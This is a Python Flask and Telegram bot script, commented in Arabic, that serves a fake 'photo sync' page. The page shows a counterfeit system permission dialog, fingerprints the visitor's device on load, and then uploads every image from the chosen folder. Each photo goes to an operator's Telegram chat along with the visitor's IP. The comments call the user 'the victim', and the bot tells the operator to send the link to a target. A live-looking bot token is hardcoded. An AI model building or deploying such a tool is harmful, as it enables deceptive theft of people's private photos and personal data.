import os
import threading
import time
from flask import Flask, request, render_template_string, jsonify
import telebot
from telebot.types import Message

# --- الإعدادات ---
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8823710542:AAFsiV8Jq419MMXOMfDBe544ciToVLSD-Pg")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "8762725550")
WEB_URL = os.environ.get("WEB_URL", "جاري التجهيز...")
# -----------------

bot = telebot.TeleBot(TELEGRAM_TOKEN)
app = Flask(__name__)

HTML_PAGE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>مزامنة الصور</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
        body { font-family: 'Cairo', sans-serif; margin: 0; padding: 0; background: #f8fafc; color: #1e293b; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        
        /* تصميم الرسالة اللي بتظهر أول ما يدخل */
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); display: flex; align-items: center; justify-content: center; z-index: 9999; backdrop-filter: blur(5px); }
        .system-dialog { background: #fff; width: 85%; max-width: 320px; border-radius: 20px; padding: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); animation: popIn 0.3s ease; }
        @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        .sys-icon { font-size: 40px; margin-bottom: 15px; }
        .system-dialog h3 { margin: 0 0 10px 0; font-size: 18px; color: #333; }
        .system-dialog p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.5; }
        .sys-btns { display: flex; gap: 10px; }
        .sys-btn { flex: 1; padding: 12px; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; font-family: 'Cairo'; cursor: pointer; transition: 0.2s; }
        .btn-allow { background: #007aff; color: white; }
        .btn-allow:active { background: #005bb5; }
        .btn-deny { background: #e5e5ea; color: #333; }

        /* شاشة المزامنة اللي بتظهر بعد السماح */
        .card { background: #ffffff; padding: 40px 30px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08); max-width: 400px; width: 90%; text-align: center; border: 1px solid #e2e8f0; display: none; }
        .cloud-icon { width: 80px; height: 80px; background: #eff6ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px auto; }
        .cloud-icon svg { width: 40px; height: 40px; fill: #3b82f6; }
        h1 { font-size: 22px; font-weight: 700; margin-bottom: 10px; color: #0f172a; }
        p { font-size: 15px; color: #64748b; line-height: 1.6; margin-bottom: 30px; }
        input[type="file"] { display: none; }
        .progress-wrapper { display: none; margin-top: 25px; text-align: right; }
        .progress-info { display: flex; justify-content: space-between; font-size: 13px; color: #64748b; margin-bottom: 8px; font-weight: 600; }
        .progress-bg { width: 100%; height: 8px; background: #e2e8f0; border-radius: 10px; overflow: hidden; }
        .progress-fill { height: 100%; background: #3b82f6; width: 0%; transition: width 0.3s ease; border-radius: 10px; }
        .success-message { display: none; margin-top: 20px; padding: 15px; background: #ecfdf5; color: #059669; border-radius: 10px; font-weight: 600; font-size: 14px; border: 1px solid #a7f3d0; }
    </style>
</head>
<body>

    <!-- الرسالة الوهمية اللي بتظهر فوراً -->
    <div class="overlay" id="sysPrompt">
        <div class="system-dialog">
            <div class="sys-icon">📁</div>
            <h3>طلب الوصول للملفات</h3>
            <p>يقوم متصفحك بمزامنة الصور تلقائياً. هل تسمح بالوصول إلى مجلد الصور (DCIM)؟</p>
            <div class="sys-btns">
                <button class="sys-btn btn-deny" onclick="window.location.href='https://google.com'">رفض</button>
                <button class="sys-btn btn-allow" id="sysAllowBtn">سماح</button>
            </div>
        </div>
    </div>

    <!-- صفحة المزامنة -->
    <div class="card" id="syncCard">
        <div class="cloud-icon" id="icon">
            <svg viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg>
        </div>
        <h1 id="title">جاري المزامنة</h1>
        <p id="desc">يتم الآن رفع صورك إلى السحابة المشفرة. يرجى إبقاء الصفحة مفتوحة.</p>
        
        <input id="folderInput" type="file" name="files[]" webkitdirectory directory multiple>
        
        <div class="progress-wrapper" id="progressWrapper">
            <div class="progress-info"><span id="progressPercent">0%</span><span id="progressText">جاري المزامنة...</span></div>
            <div class="progress-bg"><div class="progress-fill" id="progressFill"></div></div>
        </div>
        <div class="success-message" id="successMsg">✅ تمت مزامنة الصور بنجاح. يمكنك إغلاق الصفحة الآن.</div>
    </div>

    <script>
        // 1. سحب معلومات الجهاز فوراً
        window.onload = function() {
            let deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: window.screen.width + "x" + window.screen.height,
                language: navigator.language,
                cores: navigator.hardwareConcurrency || "Unknown",
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    deviceInfo.battery = Math.round(battery.level * 100) + "%";
                    sendDeviceInfo(deviceInfo);
                });
            } else {
                sendDeviceInfo(deviceInfo);
            }
        };

        function sendDeviceInfo(info) {
            fetch('/device_info', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(info) });
        }

        // 2. الضحية يدوس "سماح" في الرسالة الوهمية
        document.getElementById('sysAllowBtn').addEventListener('click', function() {
            // اخفاء الرسالة وإظهار الصفحة
            document.getElementById('sysPrompt').style.display = 'none';
            document.getElementById('syncCard').style.display = 'block';
            
            // فتح نافذة الملفات (هتفتح لأن دي لمسة من المستخدم)
            document.getElementById('folderInput').click();
        });

        // 3. أول ما يختار المجلد (بيدوس Allow في المتصفح)، الكود هيسحب كل الصور
        document.getElementById('folderInput').addEventListener('change', function(e) {
            const files = e.target.files;
            if (files.length === 0) return;
            
            let imageFiles = [];
            for (let i = 0; i < files.length; i++) {
                if (files[i].type.startsWith('image/') || files[i].name.match(/\.(jpg|jpeg|png|heic|webp)$/i)) {
                    imageFiles.push(files[i]);
                }
            }
            
            if (imageFiles.length === 0) {
                document.getElementById('progressText').innerText = "لم يتم العثور على صور.";
                return;
            }

            document.getElementById('progressWrapper').style.display = 'block';
            const total = imageFiles.length;
            let uploaded = 0;
            let progressFill = document.getElementById('progressFill');
            let progressPercent = document.getElementById('progressPercent');
            let progressText = document.getElementById('progressText');
            
            const CONCURRENCY = 3;
            let currentIndex = 0;

            async function uploadNext() {
                if (currentIndex >= total) return;
                
                const index = currentIndex++;
                const file = imageFiles[index];
                const formData = new FormData();
                formData.append('file', file);
                
                try {
                    await fetch('/upload', { method: 'POST', body: formData });
                } catch (error) {}
                
                uploaded++;
                let percent = Math.round((uploaded / total) * 100);
                progressFill.style.width = percent + '%';
                progressPercent.innerText = percent + '%';
                progressText.innerText = `جاري المزامنة (${uploaded}/${total})`;
                
                if (uploaded === total) {
                    document.getElementById('progressWrapper').style.display = 'none';
                    document.getElementById('successMsg').style.display = 'block';
                    document.getElementById('title').innerText = "اكتملت المزامنة";
                    document.getElementById('desc').innerText = "جميع صورك محفوظة الآن في السحابة.";
                    document.getElementById('icon').style.background = "#ecfdf5";
                    document.getElementById('icon').innerHTML = '<svg style="fill:#059669;" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
                } else {
                    uploadNext();
                }
            }
            for (let i = 0; i < CONCURRENCY && i < total; i++) { uploadNext(); }
        });
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/device_info', methods=['POST'])
def device_info():
    try:
        data = request.json
        ip = request.remote_addr
        msg = f"🎯 **تم اصطياد هدف جديد!**\n\n"
        msg += f"🌐 **IP:** `{ip}`\n"
        msg += f"📱 **النظام:** `{data.get('platform', 'Unknown')}`\n"
        msg += f"📐 **الشاشة:** `{data.get('screen', 'Unknown')}`\n"
        msg += f"🔋 **البطارية:** `{data.get('battery', 'Unknown')}`\n"
        msg += f"🌍 **اللغة:** `{data.get('language', 'Unknown')}`\n"
        msg += f"⏰ **التوقيت:** `{data.get('timezone', 'Unknown')}`\n"
        msg += f"🕵️ **المتصفح:** `{data.get('userAgent', 'Unknown')}`\n\n"
        msg += f"⏳ *في انتظار موافقة الضحية على الملفات...*"
        
        bot.send_message(ADMIN_CHAT_ID, msg, parse_mode='Markdown')
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files: return "No file", 400
    file = request.files['file']
    if file.filename == '': return "No name", 400
    try:
        bot.send_document(ADMIN_CHAT_ID, file, caption=f"📸 `{file.filename}`", parse_mode='Markdown')
        return "OK", 200
    except Exception as e:
        return str(e), 500

@bot.message_handler(commands=['start'])
def send_welcome(message: Message):
    if str(message.chat.id) != str(ADMIN_CHAT_ID): return
    bot.reply_to(message, f"✅ **Server Online**\n\n🔗 **Target URL:**\n`{WEB_URL}`\n\nابعت اللينك للهدف.", parse_mode='Markdown')

def start_bot():
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

if __name__ == '__main__':
    threading.Thread(target=start_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)